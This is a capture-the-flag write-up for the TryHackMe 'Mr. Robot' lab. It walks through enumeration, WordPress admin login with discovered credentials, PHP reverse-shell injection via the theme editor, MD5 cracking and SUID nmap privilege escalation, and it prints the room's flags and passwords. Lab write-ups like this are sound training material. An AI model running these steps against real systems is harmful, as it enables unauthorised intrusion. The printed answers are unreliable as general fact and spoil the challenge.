# 🖥️ Mr. Robot — TryHackMe

| Field | Details |
|---|---|
| 🏷️ Machine | Mr. Robot |
| 🌐 Platform | TryHackMe |
| 🎯 Difficulty | Medium |
| 🧠 Topics | WordPress, Base64 Credential Discovery, PHP Reverse Shell, MD5 Cracking, SUID nmap PrivEsc |
| 📅 Date | 08-12-2025 |
| 👤 Author | [Sandeep Prasad Chowdhury](https://github.com/chowdhurysandeep) |

---

## 📌 Summary

Mr. Robot is a medium-difficulty TryHackMe room themed around the TV show. The attack chain involves discovering a wordlist and credentials hidden in `robots.txt` and `/license`, logging into WordPress, injecting a PHP reverse shell via the Theme Editor, cracking an MD5 hash to switch users, and escalating to root via a SUID `nmap` binary using GTFOBins.

---

## 🔍 1. Reconnaissance & Service Enumeration

```bash
nmap -sCv <TARGET_IP>
```

**Open Ports:**

| Port | Service | Notes |
|---|---|---|
| 22 | SSH | Open |
| 80 | HTTP | WordPress site |
| 443 | HTTPS | Closed |

The HTTP service hosts a website themed after Mr. Robot with an interactive terminal-style interface.

---

## 🔎 2. Web Directory Enumeration

```bash
gobuster dir -u <TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Interesting findings:**
- `/robots.txt`
- `/license`
- `/wp-login`
- `/wp-admin`

---

## 🚩 3. robots.txt Analysis

Visiting `/robots.txt` revealed two entries:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

**Flag 1:**

```
073403c8a58a1f80d943455fb30724b9
```

✅ **Key 1 of 3 captured**

`fsocity.dic` is a **wordlist** — downloaded for later enumeration use.

---

## 🔑 4. Credential Discovery via /license

Visiting `http://<TARGET_IP>/license` shows a dark page with:
> *"do you want a password or something?"*

At the bottom, a **Base64 encoded string** is visible:

```
ZWxsaW90OkVSMjgtMDY1Mgo=
```

Used [tunnelsup.com](https://tunnelsup.com) to identify as Base64. Decoded via [base64decode.org](https://base64decode.org):

```
elliot:ER28-0652
```

✅ **Credentials found:** `elliot : ER28-0652`

---

## 💥 5. WordPress Exploitation (Initial Foothold)

### Login to WordPress Admin

Browse to `http://<TARGET_IP>/wp-login.php`:

```
Username: elliot
Password: ER28-0652
```

✅ **WordPress admin panel access granted**

### Reverse Shell via Theme Editor

Navigate to: **Appearance → Editor → 404.php**

1. Go to [revshells.com](https://revshells.com) and generate a PHP reverse shell
2. Set your `<KALI_IP>` and port `4444`
3. Paste the shell into the `404.php` template
4. Click **Update File**

Start Netcat listener:

```bash
nc -lnvp 4444
```

Trigger the shell by visiting:

```
http://<TARGET_IP>/wp-includes/themes/TwentyFifteen/404.php
```

✅ **Shell obtained as `daemon`**

Stabilize the shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🔎 6. Post-Exploitation Enumeration

```bash
cd /home
ls
# robot  ubuntu

cd robot
ls
# key-2-of-3.txt  password.raw-md5

cat key-2-of-3.txt
# Permission denied

cat password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

---

## 🔓 7. Password Cracking & User Switch

Upload the hash to [CrackStation](https://crackstation.net):

```
Hash:   c3fcd3d76192e4007dfb496cca67e13b
Result: abcdefghijklmnopqrstuvwxyz
```

Switch user:

```bash
su robot
# Password: abcdefghijklmnopqrstuvwxyz
whoami
# robot
```

### Read Flag 2

```bash
cat key-2-of-3.txt
# 822c73956184f694993bede3eb39f959
```

✅ **Key 2 of 3 captured**

---

## ⬆️ 8. Privilege Escalation — SUID nmap

Check sudo privileges:

```bash
sudo -l
# Sorry, user robot may not run sudo on this machine.
```

Search for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

**Finding:** `/usr/local/bin/nmap` has SUID bit set.

### GTFOBins — nmap Interactive Mode

Old nmap versions (2.02–5.21) support `--interactive` mode:

```bash
nmap --interactive
nmap> !sh
# whoami
# root
```

✅ **Root shell obtained**

---

## 🚩 9. Final Flag (Root)

```bash
cd /root
ls
# firstboot_done  key-3-of-3.txt

cat key-3-of-3.txt
# 04787ddef27c3dee1ee161b21670b4e4
```

✅ **Key 3 of 3 captured — Full system compromise!**

---

## 🏁 All Flags

| Flag | Value |
|---|---|
| 🏳️ Key 1 | `073403c8a58a1f80d943455fb30724b9` |
| 🏳️ Key 2 | `822c73956184f694993bede3eb39f959` |
| 🚩 Key 3 | `04787ddef27c3dee1ee161b21670b4e4` |

---

## 📚 10. Lessons Learned

- `robots.txt` can expose sensitive files and wordlists — always check it first
- Credentials hidden as Base64 in page source is a common CTF technique — check every page including `/license`
- WordPress Theme Editor is a critical attack surface when admin access is obtained
- MD5 is instantly crackable — never use it for password storage
- SUID `nmap` (old version) is a classic GTFOBins privesc path

---

## 🛠️ Tools Used

- `nmap` — port scanning
- `gobuster` — directory enumeration
- `revshells.com` — PHP reverse shell generation
- `netcat` — reverse shell listener
- `CrackStation` — MD5 hash cracking
- `GTFOBins` — SUID nmap privilege escalation

---

*Writeup by [Sandeep Prasad Chowdhury](https://github.com/chowdhurysandeep) — for educational purposes only.*
